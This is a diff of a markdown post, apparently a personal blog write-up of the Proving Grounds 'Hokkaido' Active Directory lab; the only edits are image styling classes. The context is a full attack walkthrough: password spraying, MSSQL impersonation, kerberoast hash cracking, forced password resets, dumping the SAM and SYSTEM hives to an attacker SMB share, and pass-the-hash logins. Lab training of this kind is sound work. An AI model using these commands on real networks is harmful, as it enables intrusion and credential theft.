@@ -160,7 +160,7 @@ So there's a lot going on here. We can't get very far with any of the web ports,
 
 This get us a few hits, but ultimately three usernames once we get rid of capitalization. *Side note: I had to run this same command multiple times to get anything from it, not sure why. It kept messing up my VPN which eventually crashed.*
 
-![Hokkaido1.png](/assets/images/Hokkaido/Hokkaido1.png){: .center-aligned width="600px"}
+![Hokkaido1.png](/assets/images/Hokkaido/Hokkaido1.png){: .responsive-image}
 
 We have:
 - `info@hokkaido-aerospace.com` 
@@ -174,7 +174,7 @@ We can add these users to a `usernames.txt` and then add them along with a few o
 
 The only hit we get for this is `info:info`, but that's a start. From there we can try to access some shares as the info user. 
 
-![Hokkaido2.png](/assets/images/Hokkaido/Hokkaido2.png){: .center-aligned width="600px"}
+![Hokkaido2.png](/assets/images/Hokkaido/Hokkaido2.png){: .responsive-image}
 
 Looks like we have a few different shares to check through:
 - WSUSTemp
@@ -190,13 +190,13 @@ Looks like we have a few different shares to check through:
 - homes
 	- This is interesting. It looks like each user has a directory, but it turns out they are all empty. Still, we probably have a new list of users to work with, and they seem like to already be formatted. 
  
-![Hokkaido3.png](/assets/images/Hokkaido/Hokkaido3.png){: .center-aligned width="600px"}
+![Hokkaido3.png](/assets/images/Hokkaido/Hokkaido3.png){: .responsive-image}
 
 I run crackmapexec using these usernames and the Start123! password: `rackmapexec smb 192.168.157.40  --shares -u usernames.txt -p password1.txt --continue-on-success`. And we get a hit on `discovery`. So now we have `info:info` and `discovery:Start123!`. 
 
 We can go back through some of the same commands we ran with `info:info`, but we ultimately discover that we can access the mssql instance using `impacket-mssqlclient discovery:'Start123!'@192.168.157.40 -windows-auth`. We find a database called `hrappdb`, but when we try to access it we receive this error:
 
-![Hokkaido4.png](/assets/images/Hokkaido/Hokkaido4.png){: .center-aligned width="600px"}
+![Hokkaido4.png](/assets/images/Hokkaido/Hokkaido4.png){: .responsive-image}
 
 Now I didn't know this, but apparently we can impersonate a user on mssql. The commands are as follows: 
 - `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
@@ -207,17 +207,17 @@ Now I didn't know this, but apparently we can impersonate a user on mssql. The c
 Then we can view the table names of the hrappdb database using this command: 
 `SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;` which shows us the table of `sysauth`. 
 
-![Hokkaido5.png](/assets/images/Hokkaido/Hokkaido5.png){: .center-aligned width="600px"}
+![Hokkaido5.png](/assets/images/Hokkaido/Hokkaido5.png){: .responsive-image}
 
 We can further enumerate by getting everything from that table: `SELECT * FROM sysauth;`, and we get what looks like credentials.
 
-![Hokkaido6.png](/assets/images/Hokkaido/Hokkaido6.png){: .center-aligned width="600px"}
+![Hokkaido6.png](/assets/images/Hokkaido/Hokkaido6.png){: .responsive-image}
 
 At this point we can add `hrappdb-service:Untimed$Runny` to our creds.txt file, and use it to enumerate further. We can spend some time doing that, but it can help to run `bloodhound-python` with all of these credential sets and add the zip files to bloodhound. We run this for each of the three users we have creds for, info, discovery, and hrapp-service: `bloodhound-python -u "$user" -p '$pass' -d hokkaido-aerospace.com -c all --zip -ns 192.168.157.40`
 
 After loading the results into bloodhound, we notice a few potentially important things:
 
-![Hokkaido7.png](/assets/images/Hokkaido/Hokkaido7.png){: .center-aligned width="600px"}
+![Hokkaido7.png](/assets/images/Hokkaido/Hokkaido7.png){: .responsive-image}
 
 On thing to notice is that `Angela.Davies` is a part of the `Domain Admins` group. By clicking around some more we also notice that the `maintenance` user is a part of the `Backup Operators` group. `Molly.Smith` can RDP into the target. If we check the First Degree Object Control of each of our owned users, we can see that `hrapp-service` has GenericWrite privileges on `Hazel.Green`. 
 
@@ -227,17 +227,17 @@ At this point, [this writeup](https://medium.com/@sakyb7/proving-grounds-hokkaid
 
 And it gives us hashes for `Hazel.Green`, `discovery`(don't need), and `maintenance`. (The same writeup already has one for `maintenance`, but whatever.)
 
-![Hokkaido8.png](/assets/images/Hokkaido/Hokkaido8.png){: .center-aligned width="600px"}
+![Hokkaido8.png](/assets/images/Hokkaido/Hokkaido8.png){: .responsive-image}
 
 This eventually cracks using hashcat: `hashcat -m 13100 hazelgreen.hash /usr/share/wordlists/rockyou.txt`, and we have `hazel.green:haze1988` to add to our `creds.txt` file and use. We can also check `hazel.green`'s groups and see that she is a member of the `IT` groups (transitively).
 
-![Hokkaido9.png](/assets/images/Hokkaido/Hokkaido9.png){: .center-aligned width="600px"}
+![Hokkaido9.png](/assets/images/Hokkaido/Hokkaido9.png){: .responsive-image}
 
 Apparently this means we can change certain user's passwords, inclduing `molly.smith` who we've already discovered is able to RDP into the machine. As with **Nagoya**, this is done with rpcclient. We log in with `hazel.green`, and run: `setuserinfo2 MOLLY.SMITH 23 'pizzaparty123'` to change her password. 
 
 At that point, we can rdp in with: `xfreerdp /u:molly.smith /p:pizzaparty123 /v:192.168.157.40 /drive:/home/pop/Desktop/server,kali`. Crucially, when we log in using the GUI, we can run either powershell or cmd as an administrator, simply by inputting molly.smith's credentials again. This can help us run more things. That said, we try to download a couple of scripts and Windows Defender immediately removes them, so we might need to get more creative. When we open powershell or the command prompt as administrator, we can run `whoami /priv` and get more privileges than we do if we open without being administrator. 
 
-![Hokkaido10.png](/assets/images/Hokkaido/Hokkaido10.png){: .center-aligned width="600px"}
+![Hokkaido10.png](/assets/images/Hokkaido/Hokkaido10.png){: .responsive-image}
 
 A big one here is `SeBackupPrivilege`. We run create a `C:\Temp` directory and run`reg save hklm\sam c:\Temp\sam` and `reg save hklm\system c:\Temp\system` and then copy them back to our own machine. I did this using `impacket-smbserver` like so:
 From kali:
@@ -248,14 +248,14 @@ From the target:
 - `copy C:\Temp\System \\$kaliIP\share`
 
 After that, we can run secretsdump to grab the hash of the administrator user. The full command is:`impacket-secretsdump -system System -sam SAM local`
-![Hokkaido11.png](/assets/images/Hokkaido/Hokkaido11.png){: .center-aligned width="600px"}
+![Hokkaido11.png](/assets/images/Hokkaido/Hokkaido11.png){: .responsive-image}
 
 We then can use this hash to connect to the target as Administrator using any number of tools. With impacket-smbexec, the command is: `impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4 Administrator@192.168.157.40`
 
-![Hokkaido12.png](/assets/images/Hokkaido/Hokkaido12.png){: .center-aligned width="600px"}
+![Hokkaido12.png](/assets/images/Hokkaido/Hokkaido12.png){: .responsive-image}
 
 The command is `evil-winrm -i 192.168.157.40 -u Administrator -H d752482897d54e239376fddb2a2109e4`, with the hash the second part of the hash given in the screenshot above. 
 
-![Hokkaido13.png](/assets/images/Hokkaido/Hokkaido13.png){: .center-aligned width="600px"}
+![Hokkaido13.png](/assets/images/Hokkaido/Hokkaido13.png){: .responsive-image}
 
 And so on. Either way, this lab has crashed many times, and I'm done with it at this point. 
